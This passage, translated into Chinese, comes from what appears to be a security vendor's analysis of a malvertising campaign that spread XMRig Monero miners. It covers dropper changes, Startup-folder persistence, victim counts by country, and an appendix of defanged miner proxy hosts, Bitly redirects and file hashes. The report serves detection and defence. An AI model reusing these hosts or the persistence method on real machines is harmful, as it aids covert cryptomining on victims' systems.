studio 2015\Projects\WindowsFormsApplication1\WindowsFormsApplication1\obj\Debug\65453.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\MineCor\WindowsFormsApplication1\obj\Debug\[File4org]_421057.pdb</div></pre></td></tr></table></figure>
<p>读者会注意到大量存在用户名’роаипроаип’，这个用户名粗略地从俄语翻译成毫无意义的’roaiproaip’。此外，还有一个观察到的“Роман”实例，大致从俄文翻译成英文单词“Novel”。</p>
<p>我们所看到的最后一个变化发生在2017年12月下旬，当时攻击者再次改变了用于部署恶意软件的dropper。</p>
<p>丢弃.NET，他们用Borland Delphi编译的dropper来创建必要的VBS文件。与.NET droppers不同的是，这个特定的dropper将VBS文件放在受害者的启动文件夹中以获得持久性。否则，执行流程保持不变。<img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_9.png" alt="Monero_9"></p>
<p><em>Figure 9 Latest malware dropping the VBS file</em></p>
<p>值得注意的是，使用这个dropper观察到的最新样本已经使用了以下新的IP地址用于XMRig通信：</p>
<ul>
<li>5.23.48[.]207</li>
</ul>
<h4 id="0x03-影响范围"><a href="#0x03-影响范围" class="headerlink" title="0x03 影响范围"></a>0x03 影响范围</h4><p>正如之前解释过的，在十月下旬和十二月下旬之间，攻击者严重依赖这个恶意的URL缩短服务来下载并随后执行XMRig Monero挖掘过程。所有恶意的重定向的完整列表在附录中。Bitly提供了围绕特定缩短网址的通用统计数据，这使得我们能够深入了解有多少受害者实际下载了这些样本。总的来说，我们观察到大约有一千五百万的受害者连接到这些URLs。<img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_10.png" alt="Monero_10"></p>
<p><em>Figure 10 Malicious bitly downloads over time</em></p>
<p>虽然大多数国家都受影响，但似乎东南亚，北非和南美国家受到的冲击最大。</p>
<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_11.png" alt="Monero_11"></p>
<p><em>Figure 11 Malicious bitly downloads by country</em></p>
<p>最常见的国家及其下载量如下：</p>
<ol>
<li>Thailand – 3,545,437</li>
<li>Vietnam – 1,830,065</li>
<li>Egypt – 1,132,863</li>
<li>Indonesia – 988,163</li>
<li>Turkey – 665,058</li>
<li>Peru – 646,985</li>
<li>Algeria – 614,870</li>
<li>Brazil – 550,053</li>
<li>Philippines – 406,294</li>
<li>Venezuela – 400,661</li>
</ol>
<p>正如我们以前所说的，只有一部分样本使用了URL缩短服务。事实上，250个样本只有大约100个使用了它。这使我们相信，受害者的数量远远大于我们观察到的数量1500万。</p>
<h4 id="0x04-结论"><a href="#0x04-结论" class="headerlink" title="0x04 结论"></a>0x04 结论</h4><p>通过恶意广告针对随机用户，对恶意软件文件使用看似无害的名称，同时使用内置的Windows实用程序和脚本文件，攻击者可以大规模感染受害者系统。</p>
<p>正如我们所看到的，随着时间的推移，攻击者对其恶意软件工具集进行了迭代更新，每个月都在改变他们的策略。根据SFX和.NET droppers提供的线索，有一些边缘证据表明，袭击者可能位于东欧。迄今为止，已经有至少1500万受害者。这些受害者遍布全球，但最重的目标地区包括东南亚，北非和南美洲。</p>
<p>Palo Alto Networks的客户可以通过以下几种方式防范这种威胁：</p>
<p>恶意软件使用的所有URL都被标记为恶意软件</p>
<p>所有观察到的样本在WildFire中被分类为恶意<br>陷阱可以通过WildFire集成来阻止这种威胁</p>
<h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><p><strong>XMRig Proxy Connections</strong></p>
<p>5.101.122[.]228:8080</p>
<p>5.23.48[.]207:7777</p>
<p>144.76.201[.]175:80</p>
<p>144.76.201[.]175:8080</p>
<p>f.pooling[.]cf:80</p>
<p>b.pool[.]gq:80</p>
<p>a.pool[.]ml:8080</p>
<p>a.pool[.]ml:123</p>
<p>a.pool[.]ml:443</p>
<p>a.pool[.]ml:8443</p>
<p>a.pool[.]ml:80</p>
<p>a.pool[.]ml:1725</p>
<p><strong>Malicious Bitly Redirects</strong></p>
<p>hxxp://bit[.]ly/2j3Yk8p</p>
<p>hxxp://bit[.]ly/2hxuusK</p>
<p>hxxp://bit[.]ly/2C7caP6</p>
<p>hxxp://bit[.]ly/HSGADGFDS</p>
<p>hxxp://bit[.]ly/2yV0JNa</p>
<p>hxxp://bit[.]ly/2Algzhc</p>
<p>hxxp://bit[.]ly/2zA08wz</p>
<p>hxxp://bit[.]ly/2hcsSUN</p>
<p>hxxp://bit[.]ly/2hr6KGb</p>
<p>hxxp://bit[.]ly/2xOVfPH</p>
<p>hxxp://bit[.]ly/2BoFNMr</p>
<p>hxxp://bit[.]ly/2xlWVQl</p>
<p>hxxp://bit[.]ly/2kEApR6</p>
<p>hxxp://bit[.]ly/2AkVK8t</p>
<p>hxxp://bit[.]ly/2yyUhLX</p>
<p>hxxp://bit[.]ly/2AkyUvs</p>
<p>hxxp://bit[.]ly/2zXRI6r</p>
<p>hxxp://bit[.]ly/2jjXmbJ</p>
<p>hxxp://bit[.]ly/2hzW6Rb</p>
<p>hxxp://bit[.]ly/2mkHzdP</p>
<p>hxxp://bit[.]ly/FSJKHJK</p>
<p>hxxp://bit[.]ly/2gB0ZW0</p>
<p>hxxp://bit[.]ly/2ixSCPu</p>
<p>hxxp://bit[.]ly/FSFSAASA</p>
<p>hxxp://bit[.]ly/2A5rxKB</p>
<p>hxxp://bit[.]ly/2xbUmjC</p>
<p>hxxp://bit[.]ly/2EHv415</p>
<p>hxxp://bit[.]ly/2Aq3gja</p>
<p>hxxp://bit[.]ly/2Bhr1tv</p>
<p>hxxp://bit[.]ly/2ynGl7o</p>
<p>hxxp://bit[.]ly/SOURCETXT</p>
<p>hxxp://bit[.]ly/2zGXAQx</p>
<p>hxxp://bit[.]ly/2hEhF3i</p>
<p>hxxp://bit[.]ly/2y3iGnG</p>
<p>hxxp://bit[.]ly/2ic2mvM</p>
<p>hxxp://bit[.]ly/2itoMrG</p>
<p>hxxp://bit[.]ly/2yvqOSU</p>
<p>hxxp://bit[.]ly/2zCj1n2</p>
<p>hxxp://bit[.]ly/2jEqYks</p>
<p><strong>SHA256 Hashes</strong></p>
<p>9854509ff8fab00e37fe07260a467b9520f3c0c6a0051b34a928258717e65b38</p>
<p>27bd82de7b2532a954fdcd12ecd791be8bbdb402466902865e257e537bc3268a</p>
<p>211ece6a0cc084f1253abe5d74e8d5faef5b7a9d2acafcaa5bbc53fe7d6f815c</p>
<p>760eaa1dced0c000853a5dd01756c63b358e3894e9c8b1e7416538dd1858761e</p>
<p>ffa7cd55b76a87153b50f4cb23cd03f2a9726e0b77cd8ced478794869877f8c8</p>
<p>99ad9f17956fb69b9d8f1d69c66337fb1f53e4b94870296e5e4a32c4f5c0f609</p>
<p>b1f40ea5ea6eca96a30dc5ab198f0e6904cf18de43d80595483d938292fa1717</p>
<p>51deb82ed3d442f0c2c96b63cf3ac87781cf703367228bbcf066202ff74d67b5</p>
<p>0a4377fbb8bb66cd80a48c9b9b407c9d2f1eaa2cab70c12121370f3ebacc5f41</p>
<p>e7aa5ded306d2ae02deaeb08e8d7ceb73ac2e77a2fff2dba35d42605ce9a9b0d</p>
<p>378d5d5bdf1cc7b91c59c1a839b57d5b2468097cf45ff078391bf3f1d95e6197</p>
<p>c65654eba008243779ea54fb18cf1c7f1c70edd2a0933dea19bbfabe12f74131</p>
<p>cbd16230248ac12c710d6e645864154fe23f33f5214f28e5dfb4e65728f4a95a</p>
<p>b7b5b255b7a668c9d5c287516e553ad1a33160d52804fd357a8d413fd2a9cd46</p>
<p>6e96ae1a7ba02486e0c31b840b32620405073131b9c9dc56f17de1cf4866d51e</p>
<p>1c4e7388809d71a7fc021c55532a30949031474f4f3b147b0c468a1b27c9ff74</p>
<p>a67572e6427b76d73bca63357d716748263beb5cbf7edf923ac3c7f6f214733f</p>
<p>2ce678eb7d35d60b4c4b4f73d63b3a4fce1b4da1c39160cb78040577ae16c1c9</p>
<p>8ac42287623d4be135daeaa9b8d906b017fd565549793666cab98defb3474639</p>
<p>65c7ef9acd5382b2f29d08593bfb84b2e774d9290afae1591b1d1c81b6b9dea2</p>
<p>a9861f341ad5a6ea0514d217ba43aa91d6014111846bc3d902c3256427a13031</p>
<p>a00d71047066cd2c1be2e5ab1ce1e5d107f2ac7a11f64ec6a04c093674bdd542</p>
<p>7c758b903654313928bec9929477a6d859de97ee42b3aa4c3ff278ec3faa07e4</p>
<p>198cd118351f15d24b584e7b91bed2f23af210c54df65859d29814899e64e87f</p>
<p>4ad4f390d252b9dc636fb2d423d15d4f4a89d4a2ffbaf2c0ab4667640fae61b1</p>
<p>92f66ba544616079d811930510ff5df1f0969f1818ecb3f5313ad1e9b0ae04e3</p>
<p>efa20de096ba6342b9af0369ec92bdc2659b7c81aba28f2c115b09c5f64280a3</p>
<p>28aa000367fe83cae1bbc3bde608fa8e9bfb1e55d219bdcdfd30a2979825fed3</p>
<p>9c6adb5026e152307f4a8f194d09554cde725cb17f9bb5259fac8083ffc00f62</p>
<p>56f7c101d2abffcfae91509950da7fe243d74b292947ae7f8075fd9b6221ebbd</p>
<p>0e1f82ac5acca3f826a2e5d9b5a3ba43431990aa0d0165c88ac5e0c7c84232ed</p>
<p>534b54cea7b3c337f40ac5b0cf29cd4a0d9fd66369773f670a8192f85b008f2f</p>
<p>483960f8f44f2f2d1467d3c7621063664e5f3ad43716db55d69f5c60bcda6b3c</p>
<p>c786bd8ce1c856df4ebd52814f92b525e0a33af8abd86a246ee66c6ae88d38fd</p>
<p>530871bd6a19a34e98fbb94e5c63d252f47345ed143cebb597d0389fbf239194</p>
<p>db55fd8a332b0495b678c513b9013b34d09e3281d6b594a8b2cb290cd264f456</p>
<p>d73ee4bdd3d6cbe3f68b0b11f8d74ac9b1d32bd9ae7dcf7ff7c5b4723ed5f3c4</p>
<p>42804cdf893b5087872081dbcc1bf1c9346ed624e5eddcb0638cce61f351907a</p>
<p>bbf3674ebe1948bfccb4de3b604b0bd052c1340e754ee7b81df697e16cdefd7a</p>
<p>96a62130df62ccb19a1a31264fdf379431e98859de63f5bf01773d51774ab275<em>**</em></p>
<p>f0f88095dc0e9a4b848f44e866937e70552a195804b867682453bc38abfb0359</p>
<p>273ce573ecf145687d494e040e548b5f2a954b34a3cd87d495f7a9418f540d29</p>
<p>b014dda9d7772d25ad82a3b7d63baea562883262e59d2cae5190fdd8b7c2ea8e</p>
<p>a268ddaa57470ca20556641c5072d15d8e06e8f359af31ae39d75c280276bb3f</p>
<p>d80493e4aa95dd3a524b8feed7bc1c183d5aa666fea4d761658ace23b4083db6</p>
<p>743e3615e3c70a71026a304e8139644eb3080c2d703083a1f543fb329079b9c5</p>
<p>6ba40196d339a5b73679ef8239db823d7111e07e812a9048c44381e2561599e1</p>
<p>8d779ad637a1d8c42a8c73736eff1eed0f493cba437566f3b78f080c05709aee</p>
<p>b6227e13e57676c7452b744051db22de7bc5517ca64d2cff04324181be64ebad</p>
<p>e0134955c1bc512f46fd90c37ca4e2946e4c00ca105de4ffb465e6d3efcf2fe5</p>
<p>5bdb864363a02ef1c39192fc5941d08e5637c8d3ff88f2d1548c886cf154d11d</p>
<p>6489cddbc414ccf8b7fb52d4b73260c48c51d92d403a937c919007d8b189f721</p>
<p>56406274e20c548f794044e25613c21108da55adc72252bb4e94d2d4e3aa0997</p>
<p>c1b5a8ab1d3aa78372fa90fa49fe4a9271362ae3e82eb601336dc9035b9ca078</p>
<p>5eb5a96c67c61badcbe1d2bcc733f0b667224eab9943ead7f3b6409c3cecaab2</p>
<p>9641386a29614f5cca303e2088ab00c720dfcd41b6a3f162548804e028ce86e8</p>
<p>0ef8d930b4bcc1c5aeda5d7fad73adbadc8f0b9187d2f25ec9cf8cbc271fdfd8</p>
<p>2da27931fabf48bd3661bad99289d7f218aa758f581bbc213235915809c6c79f</p>
<p>1b2ffb7f06d04f5417d272ca55627e4000dfa4371234856100023016bfa2fbde</p>
<p>de04f1b184e9658829273c0d6922864e87f7a62b395b69a0e616be53701508d9</p>
<p>0fd91e64a0b9fc0e8ed915c5f574f08ee276edc2b6cb5c374e7db6faa748dedf</p>
<p>b008f2dac98e54ca82d468063fb2df957ef3f08082409ab57279b37a46f862c8</p>
<p>0dc32454909f48fcbcd0460da9b22fe43ce7a816eb032e38780aeca993f288ff</p>
<p>90fdf62ed73ba9e264be72804d7c4325219eb8576f552b283d2c2f88d39994c3</p>
<p>e4df13b4f31f2505a82340b60d144d8bda03075fdd12be6f66baf38c6dfc78f3</p>
<p>60c439d6d025bf948a447d9223763a255cc15cb2df2db7a8dab6a5a27242feb0</p>
<p>5aa2a88bd729232acf4bb350ca1801755fcd562a5297b41a70f81c98f0e3c27f</p>
<p>24031b60c0485eaa11eaee1a5799503927799042d373bfef7d6aa23b1f9e1076</p>
<p>86b2f50b9e5ccadedbb2a2114538947a01dea49e3b20cc79cf249a0f1b3cc130</p>
<p>ffa7c9701d1b4f4f00da45652403cac843276cc72138d7d1a30dcac660bd45a8</p>
<p>1eafcb280df27d39c19b325366804c602a8f70f655d9fda227b5ff69768f30cc</p>
<p>dbb0d7c2bf65d46d7c61f71e977d077959e8ec926a540b12043ed78de50a3d83</p>
<p>1d1e2c6acedb17730f104fc1c1a1154ef312a99ed1dab65bb33aaf587e9ca3b7</p>
<p>2369f3250fa52d53d7a8f8d0b3b7addad0757d642fa9303f830944d1e27b862d</p>
<p>fda651a5fba8558677d9647bb0938c10b4c16b6b7b311402c96d59f4efbbeeea</p>
<p>447da9f937cae3841d397166b24586d88d48f6de44ad953b7c5243cb8f0fc150</p>
<p>7b5b9c9528358db7012f6f9ae607f8792124de1b8dce8a4b0710238e9f5179c6</p>
<p>bb8827a6cad2fa45de912cdb6ea8b8bc9b5d0403476d73eb2f38dc7c4ccc5c6d</p>
<p>126b36eb3aab62a03671fe5364cfb7c4b290e77d189fb4c86a37a570977375b7</p>
<p>dee1ee50d2f77ba6382c8270c8dd832815571c547cb48dcadb0a420ddbf9b4a4</p>
<p>f0082fe2399772d2045244cd0539f85d3a8b2414be4a020c78d8bcf072576f93</p>
<p>f5eaec6491ffbbd8a02a6e0316362b4ebea73cc71407704cdc7dfa027d882554</p>
<p>8629c3b7383dcfff1cb191692f374c5aff01b9ee0ba4810843c7e23c3af7716e</p>
<p>0e4212a85ec0213dd749fa8355a0d48fdbd02cfc2a35191c8eadd4f8195a52c2</p>
<p>d30e033ec02b84fbc350dbb01a708e1258c212d58316f49318ee86da05b22e88</p>
<p>268ff015b20542c5052c5623a6b9e432f0d344a1cfc275500f6a882496aa6928</p>
<p>c53f1e93859cd171cf8ba0639520d32a73ca26a9bf924b00d586b36be47dea9e</p>
<p>a76c23385d806d85544d1b653253f7d0dac9f737c4520179ff5ced5922237da0</p>
<p>3d100a7cd2dbc5ee1fb556f40f7a3c4d29284d8a009c0804e632e0c42307d85e</p>
<p>7de0bb6673f010338fe4f0c55538fc7f47d92cfcd37c0dbecdc311cc2b55f1cd</p>
<p>538ce967ae115fb5ffb090f4c133f20c0c6ceb5c67c8aeadc59e47cb498fd819</p>
<p>804c730864ef674e696cdb915701889a3b8a11abc46f14580cb710d25d86401a</p>
<p>cfcd15c6c2ca6f0f7b9c3eab9af99bcb846af2b0f352620f9c4b80852b548c17</p>
<p>bad5e8953ca0ee8c06027680af71c30d1785d0741e23360c352f622274d51a72</p>
<p>b043e53213e141f8988537a9e315563079bb6c0ddd339b05db36590e187f4d2e</p>
<p>4bde85795a657460b9d99e3b3c9d120be27f645f828cb97f6929ea8dc44e2791</p>
<p>9e39850693851da2317f49aa4df5727929c852f27ada6d69ce0323f5374ac181</p>
<p>8cfce10bb4e5b84731bc14e7100433744b126d3d5272bf754a5f95c17549a712</p>
<p>3111c755bc0fc2428873b7ad6272078cea863a2304f6388ca65e598bc2de7190</p>
<p>c90c33a40180c5aa3b514ca41cb3dc4615bed1bdc8c0572482f7a8766316dd2d</p>
<p>b22573436f1f6f1dc5c023a4c72b497a3ad219d801fd569d3fda9ced7e9d66c2</p>
<p>43942883332d09ea48b6926d5e670a86cdb9e09bff8928f40c93095f4fcb796d</p>
<p>220ba3c2d8f5638c44005866e814a4f6ba502b8f01b8db7218a87bc1e7700c8b</p>
<p>f2ada4133eb79c78207935a9a27d657480489953cfe93c8b0f88147117b47c33</p>
<p>170e8484ddebfe84dfe4b80cf0cf3ee03b03a15898a567f07b0382e76c0b433b</p>
<p>81aca5cfe7f8476a49aa51ce4f7b71faef7b3b8e208f5b77e7209fc0391ad2a2</p>
<p>ba0779de750bd1a2cd8879de506778e1b36589f91cb37aaf7e9913d7cd27431d</p>
<p>261d731390a9a73495f2fd772b0e28ef68c3450db51bf9948a8b4fe32592c36c</p>
<p>9babfee6e12d17545db3cd6968a1fb61bf548cf0204b90ef2c1ebcd66e20aef0</p>
<p>344a5d9864baf9e274f2d65600f717881c034dd9156167bfd8654c7e732d12d1</p>
<p>5cd5cba3a11ba6102d9086795561376412fc201e2d49ec00039f1a553f7a32f5</p>
<p>d05b329848fc939f6a3fb4f2e40bead858b4994b681648c09ae30587e5a2b8b3</p>
<p>c6a8cf482cc79a40c0f48f48ffd8ebf992328f73210f246f0dc64661eec04901</p>
<p>e773dfa365a33ae4159ad179de58288910d4f785f6ac72f805f305ffcb85e709</p>
<p>66e2575f658ffb972dfb76768031f6a8998ea71c6c758c872631b5ec6e7f3010</p>
<p>4350ff8266535c9258f24af86502e7e06c88fd67c3936c688f270c9f42d731fd</p>
<p>c94b77e2810b6e41e6168bf7cf78f6aea29391fb616f36ecb66ab5b1b3038240</p>
<p>ec3e601df45cffb358766ec849abda6562ac67323366e906779196d19e1344e6</p>
<p>b89d221fdc999f18db022522e3e987868414e11ed96e0d3b135a23d99895303d</p>
<p>948679b70c888c8e2d63f09abbd59c26fe6740779d76f2f72e97938ef232c1f4</p>
<p>d525b9c49914a2779478fb327fe8c57b5e17fa8f583c50528f1a19262ee73f4d</p>
<p>45848953386219205bd0c9a580c54ee102d5915bcd7fe882306c8051ea182580</p>
<p>f2ffac424ac0b9d85fb723862cabb6bcc70133777ec6811eb52f47743dcf273a</p>
<p>d8884912854923e55fa0b850e3370389aeccff171f7c3207bb1d60a98cf6f767</p>
<p>88bca86065e047293dbf41c37e9ba764b616f083304473abfd0e9b5b80d1231b</p>
<p>2c1ca4772dcbf8cdba3a4515d0f4f0ae1a29b6d2816dd1743a919da89eb2fc40</p>
<p>811e01073c90f68b22d7fbfb4f91ac95f0574b815900d179b9ac73005bc9d90a</p>
<p>d3128c20d87ae111a5817832ef09007411b2f62b1482e58ad5b5c4ec72282edd</p>
<p>b8a09a6b3ef56898c433caf67b7a11f2ed9b3409b36a6796e40c9357897f6949</p>
<p>644ebe7161c16f5a3d104c35d7a8827c50917e2a35c4eeb78cb46c13303cb633</p>
<p>85c2caeffcefe6e08efac133e804b12c4c7151bb349dbddc4a4cadd3b577f95e</p>
<p>dcdca2fb3a9185863abcea0c677b0a77de365ce1caba4c87dd68b59ca5c297b5</p>
<p>218dc474e7a8e92af183b39a3485eee08168d3449b55baf022d3afa86ba9c83d</p>
<p>e8ff1d3dead4572734f34048fc572d12190296c4877b777585e969a9391a2ffa</p>
<p>13dca944708497bf99137b5c1182d74d9c6a2be5015a3ac9bdf901ba55317ce7</p>
<p>1cf15ed88bb4b60237c569f50f97de8a72595d8a4dc58fdcba64216ee8994a7a</p>
<p>94959177e4def7047c01b9f6e6c56419be9effd59d5845104b399fdee4056d1b</p>
<p>fa171b9a49104b870d0e486a9f3c6f74f01adba346d7e65e20160567c2ad2fae</p>
<p>92c4b122cbbb308e1e8f4f3850a647ae0d8e337ab069f9f87da7c09542519928</p>
<p>af6f8d89faae26fd019380ca20c97bb706d2ed8935e31d81e1e4ddea9c309472</p>
<p>a7f41a5ee7cc229cb5a13fb5dc8c62f94901d3a59bac9b6efe071832d52578e9</p>
<p>07b4ed5b3a19e34d0c630f21b767595ec118d1b42c71ea9733db5f063d5c98dd</p>
<p>5e6aebf5d8aecbd82be5b097e5afb5d5b1dd71134b6866a76e87f0a713119f9e</p>
<p>567975dfd24f8348b7107d64068dade9dc9ee948a7ef6c2f744e3456f9c7737a</p>
<p>0bb3c079d88048f608a1a14f068dcd9ad63676d7f5ae502a8a08d1dd025b4ead</p>
<p>437ac582c3a6d2e4295934a63547c32e5531760c37ffbc3ee29e8707b90f3640</p>
<p>e3bc8b1c10595bcce2124ed9fa0268ee0d15a7299d4a191e960a17a811a7ac9d</p>
<p>2eea3e9af7528b6167fac3ca95d06fa6e4d02fbe6b7fdb06e535453ce402f897</p>
<p>7b3f0bfdb7c3a409793735aab5d580ae74eaecc41d0ee727b973ed3003f0236e</p>
<p>1dea7c7ea0df9cfc04c6426afa6078071f6525cd0fccd811b035fce6dccb0154</p>
<p>a45d9885e55df09f3ee6bf88d6fddd7f19ebbd27a4c37965ae4bdf0c8acd0db0</p>
<p>e5710cbfee54d44584f87213083c0f27cbf6aea9af8469dae499ef91f65369e3</p>
<p>7aa72bb663ef93e7a3f16282d9d92035ea16438667eddfaad1c827118234ebd8</p>
<p>9099b4035d74f956ab663890fa90289808fea035f94b154ca6aa83bbc1cba086</p>
<p>9103f81cff1eee4f8be2365ef297c805f9eb1da291dccba2c7c5d196dc733c1d</p>
<p>76ab3968e9f2efcac9ebda4d25d43f9b164e3c3ceb9566f32354348a6a778421</p>
<p>97885d7f96c49be81d449610c9b7e38358a9c1d87bdb67962cc2864e006f2317</p>
<p>72f46ba7a00d2cc821cc9d2dcc16c51cde627441beebd1eb2baeadeb01c96801</p>
<p>996200d9b836a7875482e4ab603588558e66e59372c492c0a1d65be602d59c32</p>
<p>d197faa8571bc0152347a9c30cd4c41660260088ee6cab1895ead0268386fec9</p>
<p>54df2208b4db06cf6a523e355a57c68b4b147578af51c07db40245ae450b1fce</p>
<p>4ca46d1ca6de1d7a8774b7208e4df73d318c3dfbd4b840d1fbcbc603006eaede</p>
<p>9a2204fc87495b2d0328ed9a84bf9d439048961e9bde8b31a83be492046673d1</p>
<p>d5cb52bceca5f416a638259e66fcab597e1030c7987f9fc3b15d94a8aecb4013</p>
<p>8853b9a4e271a77124ba50eb003827a14c8907597eea79c6f467e4c858e16621</p>
<p>4b562edbbb1413ca90c3419b79417c8a91f530cd49bc38beb8e46c194dc1fd52</p>
<p>ceae7114ea292f10b348c0d3999ae9a058b2afdb8da981568b0bd36cf02067ff</p>
<p>e75df0f0e1cb541bc3ec429b6f30dde96af4cb2a4bb30104229dbc65991ba559</p>
<p>66fdcb4db024195ab457ef3411deff8cd12e7a3550e3e17a052480e93ed29aca</p>
<p>a809027b2ef10d2c8142da021e04c3786163bef6358be33659264720ae1b0ffa</p>
<p>970a54440ad3359a1c2dc923f73a8ae76d96ad414883c1476ba1ff21b45eced8</p>
<p>6f22578e341560c200ed42e171f027998bdd8c0f8677a48e049c11b4c2f318d5</p>
<p>0a71033379e732e9d549a69af21140dc1c37020b9348d31ce08ad3f44b132952</p>
<p>d7c9d68a91c1c4c227f057d1e193688dd05f5ac122269f69acdf8e47e45ce194</p>
<p>d5a61eb9e44e0ffde85d9abcfc868e922285a7b57bc7a6033a7c00e561ebed7a</p>
<p>8288e43ded03dab13c4d2a76407057457f86a3df63ef06bbd47db7199d1dbea7</p>
<p>f2bc9d426383f07d3811bc631650f3a1bb53d2e7ccb2797d172a63e6e58c9b42</p>
<p>3d4a43dfdea230383b5fa600036a9688d96a8b41925dc8d91c1d2b2b6e381c73</p>
<p>fce319e35144b7acad954e031d653717dbe7b4c23bedade7e3f129e994a915ad</p>
<p>45dbd08bf2d2b1d47301d73ef9c0d6af241a1f0e9bd28a72e540edafe51877a2</p>
<p>39f46b22f75fab5e64a0210d6c9f903438d46bf0b2c95b10070533bc9f45ed69</p>
<p>cdb8231dff80be7c1245aa7dfd8cca6d0daa4da7b3a4dc0090dcc5aab04dd84b</p>
<p>bc97485d5f54ad1f857e11e080fb9b37641c4305d119d01ae661ef71ae2debf6</p>
<p>7de19a5a9ba37c09a6e31ea6bfbe8ec6f93e0f9262e195283963d8936a017069</p>
<p>a8130f3175d8b44b3a4c746943aa777da5fa9c7ebdcda3d3265966e7c16c572d</p>
<p>e777b56b1df9d2700498bcabce9377eb9a9bfd02855e937ef276d85f6db89337</p>
<p>719aeb6ac772f8865be5b61039cee4807b70f3c71a50ddb63d49e162c6b75ba3</p>
<p>2145205c19ca8c19463b2d7609e18860e420b4ce3d07d5056fd23a5a19226d0e</p>
<p>739ac745213d964efda914b78badf2eafc6e0cc1c5ff1bff0b5df4ed012805fd</p>
<p>7b7ea86146e33e1b7fc208a97df05a8c94dbc9eda750933400b41d85fb49dac4</p>
<p>3591d1b731bb29ba48822514a3f4e809f2416f8ad9033d0876bc0f2c3250bdd0</p>
<p>cc38e022de7264db020d6efe2f1830e178ccff7eff2b04acd32b46d23a96b943</p>
<p>6644b75c29c4f8905820fec631dc9dadc11fa013e52dfa1b37200691c1112de0</p>
<p>4bc8a426f3798f305d6830c30693468bbd8e01ae54402a72b25848cc663ad798</p>
<p>f9d81b4164307045fadfbdf5fae722043f62ca37704756c5b18b7662a5ae6fbb</p>
<p>188005a44a27eb3c37e52df5db570b781896f91be5c4de16a801dc51753a0d1e</p>
<p>2b8375072fbd65f76eaf8d02370145eeb2141f94a1e0d9ae71545ba571f0c805</p>
<p>82ca64cfc7e9daf4d0a82c21624930b869c6676313ae194e77d922565486acdd</p>
<p>5054985cf6d26c01d85c0d2ead6503ad02079d116c42cb1c24c0aa1d96323d54</p>
<p>1af63b20514ea992ddd6a50dca19cd0e70eda653e2832583185002c47f0ef20a</p>
<p>c89e2e05f46da001a5778e306d79f8ae62b1291c422fb0b795684df722626387</p>
<p>c089422dabac4c9b0613355fa0ccc1ea8619c757eb6e68041135662e4b3916c5</p>
<p>420c10ca1dc8bd246b88b5feef6a151dc1f063fa04cafc6e9cc9721f0b32428f</p>
<p>32552469d69c6d7a62cc9dc5552d3817ac760d2c17a183cf66b1503a02c9d234</p>
<p>d89f3317721e4a445e52156e82eac9bb9a6d91323f8ebbad1bc2312f5af48eff</p>
<p>a5aae3bbfcc6d9ab63ada620802c8b9ff55b2a0209fd74d302ff5ff6192fe766</p>
<p>2802837f671f6849e1b23d72e6107066c895a09168f555d45becab12e4143e1b</p>
<p>ece29d78f39c2c0b0d058516fd6cdd24776c559c07424b387e62ca1c1a6f885e</p>
<p>70512f06506124df1fbc29990e60a345302c36512ae870c447390afa2bd84449</p>
<p>2a90010931e0b00709027a148c10743346d7fbeaf70a68ce7b23e4b9cd261bc9</p>
<p>d1f2edb6be9527238390bda76da63cfab949c44d7c929fb2e36f1c92aa192669</p>
<p>6789c77e40944d6a58cf30a7c83f9e84a8bda3fa76d50669dfef7bce3f1992d9</p>
<p>ee876a1c1ad35f40881a9039dd9c69f80a530993d08ed3dfdb4c2db17ae8d8ba</p>
<p>85f4bc20d534b4df024b6d8a26643c278236d842b6418d45f4268e1278d30135</p>
<p>b23681cfd3db73a239a8ab37d0bc790324c1a06189ede9c7a9515c783b2bc278</p>
<p>3831cbe5b966a8a14677e6ef05ad137157e9c87d330ad57e09201946b4b48d16</p>
<p>af7d6d3eba7c25d6579475efaebd9517471560bd62ee5feee3145744d2b35ba4</p>
<p>443af7373d3cf0da600260273b6bf1db49a87a4ad5dd0e90db7acb2abc2e3534</p>
<p>84ec77121ec96212811c0e4f203ec90996959107883442e96291eddaf7656c24</p>
<p>29688e1282de66811977097d9a3bfd123c3aab6dd7f434f59505abfddf1c9c1a</p>
<p>c6caa296441b4ab2b7a9ce792b529ea5007e7df7a566d93d198472c65a756241</p>
<p>6b605f275565a93fee360806c433f7be9c099106782f07d245c2cf60bc6835f5</p>
<p>81c7735bf199732fe2bc8fd47cd8f97ddab1ce889d59a62f8b5a944fba76e173</p>
<p>45cd50b40f2b1739fea5cd3d0fbc0e561e9acf611ba60c960029e362e8761e17</p>
<p>9ff0d43a24333e655658ca5bb100adf04c757128292c91710c26fb602b859f82</p>
<p>f2237bc1b547e7af9899e5f87ce0283e8c40c4b3609167185d8cbcb57bbf68cc</p>
<p>f577d33d917f3a89d34641d5bb9de8e8d856e271b68464870034379acfbb01e0</p>
<p>0914f9fbdac67cd59ac172649b6261af2d02aa71b29da9de960aadb7a218ad59</p>
<p>32c06dfdb627ba638dd93e3c9174becd94dfde66d09901f2d6b298a03d8724eb</p>
<p>bcf2e01eed27f2011d953e6552757f26d463134e887790610b0bdae90421b49f</p>
<p>8a30f64ebb55404f9d05dacf7f27b182f9cdfeaa2ca8f203982c1f6794bc74f2</p>
<p>1761784ac0d711143c231567444be4be8921bdc80e94d8b6c44199a7bba316c4</p>
<p>a815c3e075c768934af1a599b458f5d44a9a30366fd44a2e936cdcfb9238529e</p>
<p>d229b953c0fca4e43ffbf1a2cb3fc24df913e54569ae90c2942d411d4e83fad2</p>
<p>5e492ec6f48c205cb30bc77ca5f597e192e5813dd89eb6692a60e8b3cb86c636</p>
<p>df8f747f906bf05cb877b294218a83a8300d72c68445d9c142b583f9310b8e4d</p>
<p>08b6f6c6d4a0070621e359929b5900b37073c0cab0069d69093240c415f6aa83</p>
<p>56b82cd47598f5a40d6c6f81f66606cf9b2f36e53d5291ecde9a83815ba556e0</p>
<p>18a16f79d44a948a3ef69b742d0c3398e2dac29bf33cdf3a5c94b0f06e75dbc3</p>
<p>5bdf05fb6c6a200de5ab19e5ec14cd9dc3f30d1a3b6affea5e38e3caa6e4a964</p>
<p>4d39a720b89ce1551cad19ee751a3a37159204bf2bdb31def53b69abe3a83298</p>
<p>58e4e756fc27f97cefacc16441cbd5d68ed17cc62bc4c59d205c02e538e5d77e</p>
<p>50834e6c0632d393a862e7a21734f6be2cb94a96d6f332aaa00d084bdad5d7ed</p>
